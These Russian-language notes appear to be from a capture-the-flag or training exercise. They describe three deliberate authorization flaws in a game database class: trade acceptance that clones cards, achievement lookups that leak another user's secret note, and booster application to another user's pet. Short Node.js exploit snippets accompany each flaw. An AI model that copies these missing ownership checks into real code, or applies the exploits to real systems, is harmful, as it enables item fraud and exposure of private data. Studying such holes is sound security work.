# Суть уязвимости acceptTradeVulnerable:
Проблема: Любой пользователь может принять любой трейд и склонировать любую карту.

typescript
acceptTradeVulnerable(_userId: number, tradeId: number) {
    // 1. _userId игнорируется - нет проверки, что я получатель
    // 2. Создается НОВАЯ карта (INSERT), а не передается существующая
    // 3. Оригинальная карта остается у владельца
}
Юзабилити:
// Алиса создает редкую карту
const cardId = db.createCard(aliceId, "Dragon", 999);

// Алиса создает трейд для Боба
const tradeId = db.createTrade(aliceId, bobId, cardId);

// Злоумышленник (Мэллори) перехватывает tradeId
db.acceptTradeVulnerable(malloryId, tradeId);
// Результат: у Мэллори появилась копия карты Dragon,
// а оригинал все еще у Алисы!

# Уязвимость в getAchievementDetailsVulnerable: утечка секретной заметки (secret_note) любого пользователя
Исходный код (уязвимый):

// Мэллори подставляет любое имя пользователя (игнорируется) и известный ID достижения
const secret = db.getAchievementDetailsVulnerable(
  "any_username",    // можно написать что угодно, даже несуществующего пользователя
  "ARCHIVIST",       // код не важен, т.к. передан achievementId
  42                 // ID достижения Алисы
);
или 
const secret = db.getAchievementDetailsVulnerable(
  "some_other_user",
  "ARCHIVIST"
  // achievementId не указан, вернётся последнее достижение с кодом ARCHIVIST у любого пользователя
);
# Уяза в applyBoosterVulnerable
Условия эксплуатации
Злоумышленник должен иметь хотя бы один неиспользованный бустер (pet_boosters с used = 0 и user_id = злоумышленник).

Он должен знать или угадать petId чужого питомца (ID часто идут последовательно, их можно подобрать или получить через метод getPet, который тоже не проверяет права).

Метод должен быть доступен через API (например, как эндпоинт /api/pet/apply_booster).

Пример эксплойта (скрипт на Node.js)

import Db from './db.js'; // предполагаемый путь к вашему классу Db

// Предположим, у нас есть экземпляр db (уже открытая БД)
const db = new Db('./game.db');

// Данные злоумышленника (Мэллори)
const malloryId = 123;        // ID Мэллори в системе
const malloryBoosterId = 456; // ID его бустера (можно получить через createBooster)

// Цель – питомец Алисы, ID которого Мэллори узнал (например, 789)
const alicePetId = 789;

try {
  // Применяем бустер к чужому питомцу
  const result = db.applyBoosterVulnerable(malloryId, malloryBoosterId, alicePetId);
  console.log('Успешно применён бустер к чужому питомцу:', result);
  // bio питомца Алисы изменилось на "Blessed by <payload>"
} catch (err) {
  console.error('Ошибка:', err.message);
}